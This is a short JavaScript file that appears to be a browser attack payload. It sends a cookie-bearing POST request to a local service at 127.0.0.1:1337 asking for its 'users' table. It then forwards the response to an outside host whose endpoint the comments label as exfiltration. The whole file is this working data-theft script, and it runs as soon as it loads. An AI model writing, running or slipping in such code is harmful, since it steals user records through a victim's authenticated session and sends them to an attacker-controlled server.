function submitRequest() {
  const url = "http://127.0.0.1:1337/table";
  const body = JSON.stringify({ tableName: "users" });

  fetch(url, {
    method: "POST",
    headers: {
      "Accept": "application/json, text/plain, */*",
      "Accept-Language": "fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3",
      "Content-Type": "application/json"
    },
    body: body,
    credentials: "include"  // This ensures cookies are sent with the request
  })
  .then(response => {
    if (response.ok) {
      return response.json();  // Parse JSON response
    } else {
      throw new Error('Request failed with status ' + response.status);
    }
  })
  .then(data => {
    console.log("Response data:", data);

    // Exfiltrate the result to a remote server
    fetch("https://bhx6fqq7.c5.rs/exfil", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ result: data })  // Send the result to the exfiltration endpoint
    })
    .then(exfilResponse => {
      console.log("Exfiltration response:", exfilResponse.status);
    })
    .catch(exfilError => {
      console.error("Error exfiltrating data:", exfilError);
    });
  })
  .catch(error => {
    console.error("Error:", error);
  });
}

submitRequest();
